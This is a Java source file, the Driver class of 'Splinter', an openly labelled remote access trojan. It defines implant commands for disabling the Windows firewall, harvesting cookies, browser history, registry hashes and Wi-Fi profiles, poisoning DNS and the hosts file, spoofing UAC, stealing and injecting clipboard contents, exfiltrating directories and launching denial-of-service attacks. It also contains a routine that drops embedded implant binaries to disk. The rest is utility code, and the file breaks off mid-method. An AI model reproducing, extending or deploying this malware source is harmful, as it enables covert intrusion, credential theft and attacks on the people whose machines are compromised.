/**
 * This is the Drivers class but only specifically for the Implant
 * 
 * 
 *@author Solomon Sonya
 */

package Implant;

import java.io.*;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.text.DateFormat;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.jar.JarInputStream;

import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

import Controller.Drivers.Drivers;
import Controller.GUI.JPanel_MainControllerWindow;
import Controller.GUI.JPanel_TextDisplayPane;
import Controller.GUI.Splinter_GUI;
import Controller.Thread.Thread_Terminal;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Receiver;
import Implant.FTP.Encoded_File_Transfer.File_Receiver;
import Implant.Payloads.MapSystemProperties;
import RelayBot.RelayBot_ServerSocket;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;

import java.util.*;
import Implant.*;



public class Driver 
{
	public static final String TITLE = "Splinter - RAT vrs " + Driver.VERSION + " - BETA";
	
	public static String strMyClassName = "Driver";
	
	public static final String  VERSION = "1.542";
	
	public static boolean instance_loaded_CONTROLLER = false;
	
	public static long startTime = 0;
	
	public static final String STARTUP_IMPLANT_LISTEN_FOR_MULTIPLE_CONNECTIONS = "-L";

	public static boolean acquireAgentOverheadData = true;
	public static final int IMPLANT_ID_UNKNOWN = 0;
	public static final int IMPLANT_ID_NETCAT = 1;
	public static final int IMPLANT_ID_SPLINTER_IMPLANT = 2;
	public static final int IMPLANT_ID_SPLINTER_CONTROLLER = 3;
	public static final int IMPLANT_ID_RELAY_BRIDGE = 4;
	public static final int IMPLANT_ID_RELAY_PROXY = 5;
	public static final int IMPLANT_ID_BEACON = 6;
	public static final int IMPLANT_ID_LOGGIE = 7;
	
	public static final int SERVICE_REQUEST_I_AM_SENDING_THIS_FILE = 8;
	public static final int SERVICE_RESPONSE_STORE_FILE_BYTE_CHUNK = 9;
	public static final int SERVICE_RESPONSE_I_AM_FINISHED_SENDING_FILE = 10;
	
	public static final String [] ARR_IMPLANT_NAME = new String[]{"UNKNOWN", "NETCAT", "SPLINTER - IMPLANT", "SPLINTER - CONTROLER", "SPLINTER - RELAY BRIDGE", "SPLINTER - RELAY PROXY",  "SPLINTER - BEACON IMPLANT", "SPLINTER - LOGGIE"};
	
	public static final String controller_type = "SPLINTER - CONTROLLER";
	public static final String relay_bridge_type = "SPLINTER - RELAY BRIDGE";
	public static final String relay_proxy_type = "SPLINTER - RELAY PROXY";
	public static boolean controller_is_running = false;
	
	public static final String delimeter_1 = "%%%%%";
	public static final String delimeter_2 = "#####";
	public static final String delimeter_3_logging = "@@@@@";
	public static final String delimiter_FILE_MIGRATION = "~~~~~";
	
	public static final int IMPLANT_TYPE_UNKNOWN = 0;
	public static final int IMPLANT_TYPE_SPLINTER_JAVA = 1;
	public static final int IMPLANT_TYPE_SPLINTER_PYTHON = 2;
	public static final int IMPLANT_TYPE_NETCAT = 3;
	
	public static final String SPLINTER_BEACON_INITIAL_REGISTRATION = "[SPLINTER_BEACON]";
	public static final String HANDSHAKE = "[[[HANDSHAKE]]]";
	public static final String SPLINTER_BEACON_RESPONSE_HEADER = "[SPLINTER_BEACON_RESPONSE_HEADER]";
	public static final String SPLINTER_BEACON_END_DATA_TRANSFER = "[SPLINTER_BEACON_RESPONSE_ALL_DATA_HAS_BEEN_SENT]";
	public static final String CONTROLLER_INITIAL_REGISTRATION = "[SPLINTER_CONTROLLER]";
	public static final String RELAY_INITIAL_REGISTRATION_BRIDGE = "[SPLINTER_RELAY_BRIDGE]";
	public static final String RELAY_INITIAL_REGISTRATION_PROXY = "[SPLINTER_RELAY_PROXY]";
	public static final String RELAYED_AGENT_INITIAL_REGISTRATION = "[SPLINTER_RELAYED_AGENT_INFO]";
	public static final String LOGGIE_AGENT_REGISTRATION = "[SPLINTER_LOGGIE_AGENT]";
	public static final String RELAY_ECHO = "[RELAY_ECHO]";
	
	public static final String RELAY_DOWN_MESSAGE = "RELAY_IS_DOWN";
	
	public static final String SEND_FILE_TO_CONTROLLER = "SEND_FILE";
	public static final String CAPTURE_SCREEN = "CAPTURE_SCREEN";
	public static final String RUNNING_PROCESS_LIST = "RUNNING_PS";
	public static final String DISPLAY_DNS = "DISPLAY_DNS";
	public static final String DISABLE_WINDOWS_FIREWALL = "DISABLE_WINDOWS_FIREWALL";
	public static final String ENABLE_WINDOWS_FIREWALL = "ENABLE_WINDOWS_FIREWALL";
	public static final String DISPLAY_WINDOWS_FIREWALL = "DISPLAY_WINDOWS_FIREWALL";
	
	public static final String ENABLE_CLIPBOARD_EXTRACTOR = "ENABLE CLIPBOARD EXTRACTOR";
	public static final String ENABLE_CLIPBOARD_INJECTOR = "ENABLE CLIPBOARD INJECTOR";
	public static final String DISABLE_CLIPBOARD_EXTRACTOR = "DISABLE CLIPBOARD EXTRACTOR";
	public static final String DISABLE_CLIPBOARD_INJECTOR = "DISABLE CLIPBOARD INJECTOR";
	
	public static final String REQUEST_IMPLANT_REGISTRATION = "REQUEST IMPLANT REGISTRATION";
	public static final String SET_IMPLANT_REGISTRATION = "SET IMPLANT REGISTRATION";
	
	public static final String REQUEST_BEACON_COMMAND_LIST = "REQUEST BEACON COMMAND LIST";	
	public static final String BEACON_SHORTCUT_ESTABLISH_SHELL = "ESTABLISH SHELL";
	public static final String BEACON_EXECUTE_COMMAND = "BEACON COMMAND";
	public static final String BEACON_END_COMMAND_UPDATE = "[END BEACON COMMAND UPDATES]";
	
	public static final String SCRAPE_SCREEN = "SCRAPE SCREEN";
	public static final String DISABLE_RECORD_SCREEN = "DISABLE RECORD SCREEN";
	
	public static final String GRAB_HOST_FILE = "GRAB HOST FILE";
	public static final String APPEND_HOST_FILE = "APPEND HOST FILE";
	public static final String APPEND_TO_HOST_FILE = "APPEND TO HOST FILE";
	public static final String POISON_HOST_DNS = "POISON HOST DNS";
	public static final String POISON_DNS = "POISON DNS";
	//public static final String OVERWRITE_HOST_DNS_FILE = "OVERWRITE HOST DNS FILE";
	
	public static final String BEGIN_HOST_FILE_POISON_DATA = "BEGIN HOST FILE POISON DATA";
	public static final String STORE_HOST_FILE_POISON_DATA = "STORE HOST FILE POISON DATA";
	public static final String END_HOST_FILE_POISON_DATA = "END HOST FILE POISON DATA";
	
	public static final String BEGIN_CREATE_MASS_USER_ACCOUNTS_DATA = "BEGIN MASS USER ACCOUNTS DATA";
	public static final String STORE_MASS_USER_ACCOUNTS_DATA = "STORE MASS USER ACCOUNTS DATA";
	public static final String END_CREATE_MASS_USER_ACCOUNTS_DATA = "END MASS USER ACCOUNTS DATA";
	
	public static final String DOS_WEBSITE = "DOS WEBSITE";
	public static final String DOS_WEBSITE_HALT = "HALT DOS WEBSITE";
	
	public static final String DOS_FTP_SERVER = "DOS FTP SERVER";
	public static final String DOS_FTP_SERVER_HALT = "HALT DOS FTP SERVER";
	
	
	public static String CHAT_MESSAGE_BROADCAST = "CHAT_MESSAGE";
	public static String FLAG_BROADCAST = "BROADCAST";
	public static String FLAG_PRIVATE = "PRIVATE";
	
	public static final int THREAD_READLINE_INTERRUPT_INTERVAL_MILLIS = 10;//INTERRUPT 100 TIMES PER SECOND to read each line
	public static final int THREAD_RUNNING_PROCESS_LIST_INTERVAL_MILLIS = 2000;
	public static final int THREAD_REFRESH_JTABLE_RUNNING_PROCESS_LIST_INTERVAL_MILLIS = 100;
	public static final int THREAD_REFRESH_FILE_BROWSWER_INTERVAL_MILLIS = 100;
	
	
	public static final String BEGIN_RUNNING_PROCESS_LIST = "BEGIN_RUNNING_PS";
	public static final String DATA_RUNNING_PROCESS_LIST = "DATA_RUNNING_PS";	
	public static final String END_RUNNING_PROCESS_LIST = "END_RUNNING_PS";
	public static final String STOP_RUNNING_PROCESS_LIST = "STOP_RUNNING_PS";
	public static final String ENUMERATE_SYSTEM = "ENUMERATE";	
	public static final String HARVEST_WIRELESS_PROFILE = "HARVEST_WIRELESS_PROFILE";
	public static final String HARVEST_COOKIES = "HARVEST_COOKIES";
	public static final String HARVEST_BROWSER_HISTORY = "HARVEST_BROWSER_HISTORY";
	public static final String HARVEST_REGISTRY_HASHES = "HARVEST_REGISTRY_HASHES";
	public static final String SPOOF_UAC = "SPOOF_UAC";
	public static final String SET_WALLPAPER = "SET_WALL_PAPER";
	
	public static final String FILE_BROWSER_HEADER = "FILE_BROWSER_HEADER";//THIS IS SO WE KNOW TO PLACE THE SOCKET DATA IN THE MAIN CONSOLE OR TO PLACE IN THE FILE BROWSER DIALOG. THIS PROCEEDS ALL COMMANDS RELATING TO FILE BROWSER
	public static final String FILE_BROWSER_INITIATE = "INITIATE_FILE_BROWSER";
	public static final String FILE_BROWSER_MESSAGE = "FILE_BROWSER_MESSAGE";//TO BE DISPLAYED IN THE CONSOLE OUT OF THE FILE BROWSER FRAME
	public static final String BEGIN_FILE_BROWSER_FILE_ROOTS = "BEGIN_FILE_ROOTS";
	public static final String FILE_BROWSER_FILE_ROOTS = "FILE_ROOTS";
	public static final String END_FILE_BROWSER_FILE_ROOTS = "END_FILE_ROOTS";
	public static final String FILE_BROWSER_CURRENT_PATH = "CURRENT_PATH";//ALSO SIGNIFIES FOR US TO CLEAR THE CURRENT ARRAYLIST OF DATA BECAUSE NEW FILE OBJECTS SHOULD BE COMING
	public static final String FILE_BROWSER_MAP_DIRECTORY = "FILE_BROWSER_MAP_DIRECTORY";
	public static final String FILE_BROWSER_CREATE_DIRECTORY = "FILE_BROWSER_CREATE_DIRECTORY";
	public static final String FILE_BROWSER_DELETE_DIRECTORY = "FILE_BROWSER_DELETE_DIRECTORY";
	public static final String FILE_BROWSER_EMPTY_DIRECTORY = "EMPTY_DIRECTORY";
	public static final String FILE_BROWSER_CAT_FILE = "CAT_FILE";
	public static final String BEGIN_FILE_BROWSER_FILE_LIST = "BEGIN_FILE_LIST";
	public static final String FILE_BROWSER_FILE_LIST = "FILE_LIST";
	public static final String END_FILE_BROWSER_FILE_LIST = "END_FILE_LIST";
	public static final String EMPTY_DIRECTORY_MESSAGE = "** NOTE -> No [Files] populated under specified directory: ";
	
	public static final String STOP_PROCESS = "STOP_PROCESS";
	
	public static final String ORBIT_DIRECTORY = "ORBIT_DIRECTORY";
	public static final int ORBIT_DIRECTORY_DELAY_MILLIS = 1000;
	public static final String STOP_ORBIT_DIRECTORY = "STOP_ORBIT_DIRECTORY";
	
	public static final String EXFIL_DIRECTORY = "EXFIL_DIRECTORY";
	
	public static final String EXTRACT_CLIPBOARD = "EXTRACT_CLIPBOARD";
	public static final String INJECT_CLIPBOARD = "INJECT_CLIPBOARD";
	public static final String RESPONSE_CLIPBOARD = "RESPONSE_CLIPBOARD";
	public static final String NO_TEXT_RESPONSE_CLIPBOARD = " * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *";
	public static final String NO_TEXT_RESPONSE_CLIPBOARD_ERROR = " *** --> NO TEXT IN CLIPBOARD AVAILABLE <-- ***";
	
	public static final String DATA_EXFIL_EXTRACTOR_PAYLOAD = "EXTRACTOR_PAYLOAD";
	public static final String DATA_EXFIL_SELECTOR_PAYLOAD = "SELECTOR_PAYLOAD";
	public static final String DATA_EXFIL_INSPECTOR_PAYLOAD = "INSPECTOR_PAYLOAD";
	public static final String DATA_EXFIL_INJECTOR_PAYLOAD = "INJECTOR_PAYLOAD";
	public static final String DATA_EXFIL_ALERTER_PAYLOAD = "ALERTER_PAYLOAD";
	
	
	public static final String UPLOAD_FILE_TO_CONTROLLER = "UPLOAD_FILE";//REMEMBER TO PLACE CONTROLLER ADDRESS (IP AND PORT)
	public static final String DOWNLOAD_FILE_FROM_CONTROLLER = "DOWNLOAD_FILE";//REMEMBER TO PLACE CONTROLLER ADDRESS (IP AND PORT)
	public static final String SHARE_DIRECTORY = "SHARE_DIRECTORY";//GIVE THE DIRECTORY NAME
	public static final String TIME_STOMP = "UPLOAD_FILE";
	public static final String MOVE_FILE = "MOVE_FILE";//INCLUDES DIRECTORY, REMEMBER TO INCLUDE ABSOLUTE PATH TO FILE AND ABSOLUTE DIRECTORY TO MOVE TO
	public static final String SET_PERMISSIONS = "SET_PERMISSIONS";
	public static final String CAT_FILE = "CAT_FILE"; //SHORTCUT FOR TYPE OR CAT COMMAND
	public static final String DELETE_FILE = "DELETE_FILE";
	
	public static final int    RELAY_BEACON_INTERVAL_MILLIS = 1000;
	public static final String RELAY_DELIMETER_INITIAL_REGISTRATION = "[RELAY_INITIAL_RGISTRATION]";	
	public static final String RELAY_CLEAR_RELAY_SOCKETS = "[RELAY_CLEAR_MY_REPORTED_SOCKETS]";
	public static final String RELAY_NEW_SOCKET = "[RELAY_NEW_CONNECTED_IMPLANT]";
	public static final String RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY = "[RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY]";
	public static final String RELAY_FORWARD_DELIMETER = "[RELAY_MESSAGE_TO_FORWARD_CONTROLLER]";
	
	public static final String SCREEN_CAPTURE_DIRECTORY_NAME = "SCREEN CAPTURE";
	
	public static final String CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT = "png";
	
	public static final String CONNECT_TO = "CONNECT TO";
	/*public static final String CONNECT = "CONNECT";
	public static final String JOIN = "JOIN";
	public static final String JOIN_TO = "JOIN TO";*/
	
	public static FTP_ServerSocket FTP_ServerSocket = null;
	
	public static String myHandShake = "";
	
	public static final String FILTER_DELIMITER = ",";
	
	public static int myImplant_Type = IMPLANT_TYPE_SPLINTER_JAVA;
	
	public static final String fileSeperator = System.getProperty("file.separator");
	
	//DROPPERS
	public static final String jar_dropper_name = "Splinter.jar";
	public static final String python_dropper_name = "Splinter.py";
	public static final String dropper_JavaImplantPath =    "/Implant/Binaries/Implants/Java/" + jar_dropper_name;	
	public static final String dropper_PythonImplantPath = "/Implant/Binaries/Implants/Python/" + python_dropper_name;
	
	public static volatile boolean outputEnabled = true;
	public static final String extension = "png"; 
	
	public static boolean enableGPS_Resolution = true;
	
	public static JPanel_TextDisplayPane jtxtpne_CnslOut = null;
	
	public static JPanel_TextDisplayPane txtpne_broadcastMessages = null;
		
	public static volatile ArrayList<Long> alRandomUniqueImplantIDs = null;
	
	public static final String KILL_TOKEN = "killImplant";
	public static final String DISCONNECT_TOKEN = "disconnectImplant";
	public static final String DISCONNECT_RELAY = "disconnectRelay";
	public static final String DISCONNECT_LOGGER = "disconnectLogger";
	public static final String SHUTDOWN_RELAY = "shutdownRelay";
	public static final String SPLINTER_DELIMETER_INITIAL_REGISTRATION = "[SPLINTER_IMPLANT]";
	public static final String SPLINTER_DELIMETER_OPEN = "[SPLINTER_IMPLANT@";
	public static final String INTERNAL_DELIMETER = "/";
	public static final String SHORTCUT_KEY_HEADER = "<@SHORTCUT>" + INTERNAL_DELIMETER;	
	
	public static final String SHORT_KEY_DEFAULT_IMPLANT_NAME = "Splinter_RAT.jar";
	
	public static final int SHORTCUT_VALUE_ESTABLISH_PERSISTENT_LISTENER = 3;
	public static final int SHORTCUT_BROWSE_REMOTE_FILE_SYSTEM = 4;
	
	
	public static volatile long numConnectedImplants = 0;
	
	public static volatile File fleCurrentWorkingDirectory = null;
	
	public static ArrayList<Splinter_IMPLANT> alImplant = null;
	public static ArrayList <Thread_Terminal> alBeaconTerminals = new ArrayList<Thread_Terminal>();
	
	public static volatile ArrayList<FTP_Thread_Receiver> alConnectedFTPClients;	
	
	public static File fleFTP_FileHiveDirectory = null;
	public static volatile boolean  autoAcceptFTP_Files = false;
	
	public static ArrayList<Thread_Terminal> alRelayTerminals = new ArrayList<Thread_Terminal>();
	public static ArrayList<Thread_Terminal> alLoggingAgents = new ArrayList<Thread_Terminal>();
	
	static Thread_Terminal terminal_log = null;
	
	public static String CURRENT_WORKING_DIRECTORY = "";

	public static MapSystemProperties systemMap = new MapSystemProperties(false);
	
	public static boolean isLoggingEnabled = true;
	
	public static InetAddress interfaceBindAddress = null;
	
	//KILL SWITCH
	public static final String ddon = "ddon";
	
	//
	//WORKER THREADS
	//
	public static final int CLIPBOARD_INTERRUPT_INTERVAL_MILLIS = 200;//5 times a second
	public static final int RECORD_SCREEN_INTERRUPT_INTERVAL_MILLIS = 1000;//5 times a second
	
	//
	//Beacon
	//
	public static String [] arrShortCuts = new String[]	{	
															JPanel_MainControllerWindow.strShortcut_Title,
															Driver.BEACON_SHORTCUT_ESTABLISH_SHELL,
															/*JPanel_MainControllerWindow.strShortcut_HarvestHash,
															JPanel_MainControllerWindow.strOrbitDirectory,
															JPanel_MainControllerWindow.strEnumerateSystem,
															JPanel_MainControllerWindow.strShortcut_CopyClipboard,
															JPanel_MainControllerWindow.strDisableWindowsFirewall,
															JPanel_MainControllerWindow.strEnableWindowsFirewall,
															JPanel_MainControllerWindow.strDisplayWindowsFirewall*/
			
														};
	
	
	public static void printConsoleWelcomeSplash(JPanel_TextDisplayPane console)
	{
		try
		{
			if(console != null)
			{
				console.appendString(false,  "*******************************************************************************", Drivers.clrForeground, Drivers.clrBackground);
				console.appendString(false,  "*    " + Drivers.NICK_NAME + " -RAT version " + Driver.VERSION + " - BETA" + " Developed by @Carpenter1010 - Solomon Sonya               *", Drivers.clrForeground, Drivers.clrBackground);
				console.appendString(false,  "*******************************************************************************", Drivers.clrForeground, Drivers.clrBackground);
			}
			
			else //print to standard out
			{
				System.out.println("\n*******************************************************************************");
				System.out.println("*    " + Drivers.NICK_NAME + " vers " + Driver.VERSION + " - BETA" + " Developed by @Carpenter1010 - Solomon Sonya   *");
				System.out.println("* Additional resources can be found at www.github.com/splinterbotnet.com      *");
				System.out.println("*******************************************************************************\n\n");
			}
		}
		
		catch(Exception e)
		{
			System.out.println("* * * OUTPUT OPENED DISPLAY * * ");
		}
		
		
	}
	
	public static boolean logReceivedLine(boolean directionIN, long threadID, String agentRegistrationID, String sender, String recipient, String senderIP, String recipientIP, String line)
	{
		try
		{
			if(!Driver.isLoggingEnabled)
			{
				return false;
			}
			
			if(Driver.alLoggingAgents == null)
			{
				Driver.alLoggingAgents = new ArrayList<Thread_Terminal>();
				return false;
			}
			
			if(Driver.alLoggingAgents.size() < 1)
			{
				return false;
			}
			
			if(line == null || line.trim().equals(""))
			{
				return false;
			}
			
			for(int i = 0; i < Driver.alLoggingAgents.size(); i++)
			{
				terminal_log = Driver.alLoggingAgents.get(i);
				
				try
				{
					
					
					terminal_log.pwOut.println(directionIN  + Driver.delimeter_3_logging + threadID + Driver.delimeter_3_logging + agentRegistrationID + Driver.delimeter_3_logging + sender + Driver.delimeter_3_logging + recipient + Driver.delimeter_3_logging + senderIP + Driver.delimeter_3_logging + recipientIP + Driver.delimeter_3_logging + line);
					terminal_log.pwOut.flush();
				}
				catch(Exception ee)
				{
					continue;
				}
				
				
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("logReceivedLine", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	
	public static String getFileName_From_FullPath(File fle)
	{
		try
		{
			if(fle == null || !fle.exists() || !fle.isFile())
			{
				Drivers.sop("INVALID FILE SPECIFIED!!!");
				return " ";
			}
			
			try
			{
				return fle.getCanonicalPath().substring(fle.getCanonicalPath().lastIndexOf(Drivers.fileSeperator)+1);
			}
			catch(Exception e)
			{
				return fle.getCanonicalPath();
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("getFileName_From_FullPath", "Driver", e, "", false);
		}
		
		return " ";
		
	}
	
	public static String getFileName_From_FullPath(String fleName)
	{
		try
		{
			if(fleName == null || fleName.trim().equals(""))
			{
				Drivers.sop("INVALID FILE SPECIFIED!!!");
				return " ";
			}
			
			try
			{
				return fleName.substring(fleName.lastIndexOf(Drivers.fileSeperator)+1);
			}
			catch(Exception e)
			{
				return fleName;
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("getFileName_From_FullPath on String", "Driver", e, "", false);
		}
		
		return " ";
		
	}
	
	public static void sop(String line)
	{
		if(outputEnabled)
			System.out.println(line);
		
		//try to output to console out as well
		try	{if(jtxtpne_CnslOut != null){jtxtpne_CnslOut.appendString(false,  line, Drivers.clrForeground, Drivers.clrBackground);	}	}catch(Exception e){}		
						
	}
	
	public static void sp(String line)
	{
		if(outputEnabled)
			System.out.print(line);
		
		//try to output to console out as well
				try	{if(jtxtpne_CnslOut != null){jtxtpne_CnslOut.appendString(false,  line, Drivers.clrForeground, Drivers.clrBackground);	}	}catch(Exception e){}	
	}
	
	/**
	 * Get a unique random number that the connected agent will use in all further communications with Splinter
	 * This is actually to better split the delimeters exchanged between this agent
	 * @return
	 */
	public static long getUniqueRandomNumber()
	{
		try
		{
			long rand = (long) (Math.random() * Drivers.MAX_THREAD_COUNT);
			
			while(Driver.alRandomUniqueImplantIDs.contains(rand))
			{
				Drivers.sop("In getUniqueRandomNumber mtd in Drivers.  Rand number: " + rand + " already exists. Generating a new one");
				return getUniqueRandomNumber();
			}
			
			//got here, thus, unique rand is generated. add to the arraylist and return it
			Driver.alRandomUniqueImplantIDs.add(rand);
			
			return rand;
		}
		
		catch(Exception e)
		{
			Drivers.eop("getUniqueRandomNumber", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return 0;
	}
	
	static public void eop(String mtdName, String myClassName, Exception e, String errorMessage, boolean printStackTrace)
	{
		//e.printStackTrace(System.out);
		
		if(errorMessage == null || errorMessage.trim().equals(""))
			sop("\nException caught in " + mtdName + " mtd in " + myClassName);
		
		else 
			sop("\nException caught in " + mtdName + " mtd in " + myClassName + " Error Message: " + errorMessage);
		
		if(printStackTrace)
			e.printStackTrace(System.out);
	}
	
	
	/**
	 * Read in the file.  Each line in file will be an element in the linkedlist
	 * @param fleToRead
	 * @return
	 */
	public static LinkedList getFile_LinkedList(File fleToRead)
	{
		BufferedReader brIn = null;
		
		try
		{
			
			
			LinkedList<String> llReadFile = new LinkedList<String>();
			
			if(fleToRead == null || !fleToRead.exists() || !fleToRead.isFile())
			{
				throw new Exception ("Invalid file specified! Unable to continue...");
			}
			
			Driver.sop("Attempting to load file into memory: " + fleToRead.getCanonicalPath());
			
			brIn =  new BufferedReader(new InputStreamReader(new FileInputStream(fleToRead)));
			
			String line = "";
			
			while((line = brIn.readLine()) != null)
			{
				llReadFile.add(line);
			}
			
			brIn.close();
			
			Driver.sop("File load successful. Passing structure back now...");
			
			return llReadFile;
		}
		
		catch(Exception e)
		{
			//Driver.eop("getFile_LinkedList", "Driver", e, "", false);
			Driver.sop("File read failed! Perhaps a different process retains a handle to the file???");
		}
		
		try
		{
			if(brIn != null)
			{
				brIn.close();
			}
		}catch(Exception e){}
		
		return null;
	}
	
	
	public static boolean dropImplantFile(String pathInJAR_To_Extract, String implantName_And_Extension)
	{
		
		//first ensure we have the dropper file within this jar!
		java.net.URL url_Dropper = Splinter_GUI.class.getResource(pathInJAR_To_Extract);
		
		
		
		try
		{			
			
			//if(url_Dropper == null || url_Dropper.toString().trim().equals("") || url_Dropper.toURI() == null || url_Dropper.toURI().toString().trim().equals(""))
			if(url_Dropper == null || url_Dropper.toString().trim().equals(""))
			{
				String errorMsg = "* * * ERROR --> " + pathInJAR_To_Extract + " does not exist within this image file!!!!!  I am Unable to process drop request";
				Driver.sop(errorMsg);
				
				return false;
			}
			
			//made it here, the file exists, query to know location to drop the file
			File dropDirectory = Driver.querySelectFile(false, "Please Select the Directory to drop the implant", JFileChooser.DIRECTORIES_ONLY, false, false);

			if(dropDirectory != null && dropDirectory.isDirectory() && dropDirectory.exists())
			{
				//Create the Out File
				File implantOutFile = null;
				
				if(dropDirectory.getCanonicalPath().trim().endsWith(Driver.fileSeperator))
				{
					implantOutFile = new File(dropDirectory.getCanonicalFile() + implantName_And_Extension);
				}
				else//else, add the seperator between directory and implant file name
				{
					implantOutFile = new File(dropDirectory.getCanonicalFile() + Driver.fileSeperator + implantName_And_Extension);
				}
				
				//open reader on the JAR file, and a writer on the outputfilestream to write file to disk
				//FileInputStream isIn = new FileInputStream(new File(url_Dropper.toURI()));
				InputStream isIn = (Driver.class.getResourceAsStream(pathInJAR_To_Extract));
				FileOutputStream osOut = new FileOutputStream(implantOutFile);
				
				//read from this file and write to disk
				int bufferSize = 4096;
				int totalBytesWritten = 0;
				byte[] buffer = new byte[bufferSize];
				int bytesReadFromBuffer;
				while ((bytesReadFromBuffer = isIn.read(buffer, 0, bufferSize)) > 0) 
				{
					osOut.write(buffer, 0, bytesReadFromBuffer);
					totalBytesWritten += bytesReadFromBuffer;
				}
				
				//done writing the file, close the streams!
				isIn.close();
				osOut.close();
				
				Driver.sop("Implant Extraction successful!!! " + " total bytes written: " + Driver.getFormattedFileSize_String(totalBytesWritten) + "  --> Saved at " + implantOutFile.getCanonicalPath() );
				
			}
			else
			{
				Driver.sop("No directory selected to drop implant file.");
				return false;
			}
			
			
			
			
			return true;
		}
		
		catch(FileNotFoundException fnfe)
		{
			try
			{
				Driver.sop(" ERROR!!! --> Unable to save to location: " + new File(url_Dropper.toURI()).getCanonicalPath() + " <-- Perhaps this location is restricted, or Access is Denied!  Please try a different location");
			}
			catch(Exception ee)
			{
				Driver.sop("NOPE!!! --> Unable to save to location.  Perhaps this location is restricted, or Access is Denied!  Please try a different location");
				
			}
		}
		
		catch(Exception e)
		{
			Driver.eop("dropFile", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	

	static public String getFormattedFileSize_String(String fileSize_bytes)
	{
		try
		{
			return Driver.getFormattedFileSize_String(Long.parseLong(fileSize_bytes));
		}
		catch(Exception e)
		{
			
		}
		
		return fileSize_bytes;
	}
	
	/**
	 * NOTE: DUPLICATE METHOD IS BEING PLACED IN THE THREAD_JLABEL CLASS AS WELL!!!
	 * @param fileSize_bytes
	 * @return
	 */
	static public String getFormattedFileSize_String(long fileSize_bytes)    
    {
        try
        {
        	double fileSize = fileSize_bytes; 
        	
        	//DecimalFormat formatter = new DecimalFormat("###.##");
        	DecimalFormat formatter = new DecimalFormat("##0.00");

             if (fileSize_bytes < 1000)
             {
                  return  formatter.format(fileSize) + " B";
             }

             else if (fileSize_bytes > 1 && fileSize_bytes < 99e3)//kb
             {
            	 return  formatter.format(fileSize_bytes / 1e3) + " KB";
             }

             else if (fileSize_bytes > 1e3 && fileSize_bytes < 99e6)//mb
             {
            	 return  formatter.format(fileSize_bytes / 1e6) + " MB";
             }

             else if (fileSize_bytes > 1e6 && fileSize_bytes < 99e9)//gb
             {
            	 return  formatter.format(fileSize_bytes / 1e9) + " GB";
             }

             else if (fileSize_bytes > 1e9 && fileSize_bytes < 99e12)//tb
             {
            	 return  formatter.format(fileSize_bytes / 1e12) + " TB";
             }
             else if (fileSize_bytes > 1e12 && fileSize_bytes < 99e15)//pb
             {
            	 return  formatter.format(fileSize_bytes / 1e15) + " PB";
             }
             else//default
             {
            	 return  formatter.format(fileSize_bytes) + " B";
             }                  
            
        }
        catch (Exception e)
        {
        	Drivers.eop("getFormattedFileSize_String", "Driver", e, e.getMessage(), true);        	
        }

        Drivers.sop("Unable to determine File Size");
        
        return ""+fileSize_bytes;
    }
	
	/** 
	 * This method returns an ArrayList<File> of files with in the directory path specified.
	 * NOTE: It only goes 1 layer deep, i.e. no recursive directory indexing, it will only populate a list of files within the current directory
	 */
	public static ArrayList getFilesUnderSelectedDirectory(File fleDirectoryPath, boolean limitFilesTo_ONLY_AcceptableFileExtensions)
	{
		ArrayList<File> alToReturn = new ArrayList<File>();
		
		try
		{
			if(fleDirectoryPath == null)
				throw new Exception("Null value passed in");
			
			if(fleDirectoryPath.isFile())
				throw new Exception("Directory path was specified; instead, received path to a file");
			
			//Get a directory listing from the path specified
			File fleFilePaths[] = fleDirectoryPath.listFiles();
			
			String strFleExtension = "";
			//loop to see which files we'll keep; note, directories will be thrown out.  No recursive searching at this time
			for(int i = 0; i < fleFilePaths.length; i++)
			{
				if(fleFilePaths[i].isFile())
				{
					//ensure only file types allowed are populated here
					if(limitFilesTo_ONLY_AcceptableFileExtensions)
					{
						strFleExtension = (Driver.getFileExtension(fleFilePaths[i], false)).replace(".", "");
						//if(Drivers.lstAcceptableFileExtensionsForStego.contains(strFleExtension.toLowerCase()))
						//	alToReturn.add(fleFilePaths[i]);
					}
					else//no need to limit the results, simply add all files
					{
						alToReturn.add(fleFilePaths[i]);
					}
					
					
				}
			}
			
			return alToReturn;
		}
		
		catch(Exception e)
		{
			Drivers.eop("getFilesUnderSelectedDirectory", "Driver", e, e.getMessage(), true);
		}
		
		return null;
	}
	
	/** 
	 * This method returns an ArrayList<File> of files with in the directory path specified.
	 * NOTE: It only goes 1 layer deep, i.e. no recursive directory indexing, it will only populate a list of files within the current directory
	 * setting acceptableExtensions null will pass back all files found under selected top folder
	 * 
	 * (this is the new method)
	 */
	public static ArrayList<File> getFilesUnderSelectedDirectory(File fleDirectoryPath, String [] acceptableExtensions)
	{
		ArrayList<File> alToReturn = new ArrayList<File>();
		
		
		java.util.List<String> lstAcceptableFileExtensions = null;
		
		if(acceptableExtensions != null)
			lstAcceptableFileExtensions = Arrays.asList(acceptableExtensions);
		
		
		
		try
		{
			if(fleDirectoryPath == null)
				throw new Exception("Null value passed in");
			
			if(fleDirectoryPath.isFile())
				throw new Exception("Directory path was specified; instead, received path to a file");
			
			//Get a directory listing from the path specified
			File fleFilePaths[] = fleDirectoryPath.listFiles();
			
			String strFleExtension = "";
			//loop to see which files we'll keep; note, directories will be thrown out.  No recursive searching at this time
			for(int i = 0; i < fleFilePaths.length; i++)
			{
				if(fleFilePaths[i].isFile())
				{
					//ensure only file types allowed are populated here
					if(lstAcceptableFileExtensions != null)
					{
						strFleExtension = (Driver.getFileExtension(fleFilePaths[i], false)).replace(".", "");
						if(lstAcceptableFileExtensions.contains(strFleExtension.toLowerCase()) || lstAcceptableFileExtensions.contains(strFleExtension.toUpperCase()))
							alToReturn.add(fleFilePaths[i]);
					}
